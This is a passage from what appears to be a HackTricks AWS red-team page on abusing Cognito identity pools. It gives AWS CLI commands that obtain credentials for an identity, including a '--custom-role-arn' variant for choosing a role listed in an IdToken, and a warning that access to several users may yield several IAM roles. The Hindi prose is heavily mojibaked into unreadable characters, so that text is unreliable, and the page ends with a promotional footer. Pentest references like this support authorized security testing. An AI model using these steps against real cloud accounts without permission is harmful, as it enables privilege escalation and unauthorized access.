aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# IdToken рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреВрдорд┐рдХрд╛рдПрдБ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреВрд▓ рд╕рдореВрд╣реЛрдВ рдХреЗ рдХрд╛рд░рдг
# рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП --custom-role-arn рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
**рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдИрдбреЗрдВрдЯрд┐рдЯреА рдкреНрд░рджрд╛рддрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рднрд┐рдиреНрди IAM рднреВрдорд┐рдХрд╛рдПрдБ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ** рдЬрд┐рд╕ рдкреНрд░рдпреЛрдХреНрддрд╛ рдХреЛ рд▓реЙрдЧ рдЗрди рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдлрд┐рд░ рдХреЗрд╡рд▓ **рдЙрдкрдпреЛрдХреНрддрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░** (рджрд╛рд╡реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рд╣реА рдпрд╛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ **рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдФрд░ рдЙрди рд╕рднреА рдХреЗ рдЖрдИрдПрдо рднреВрдорд┐рдХрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдореЗрдВ рд▓рд╛рдн рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**ред
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ HackTricks рдореЗрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдЖрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
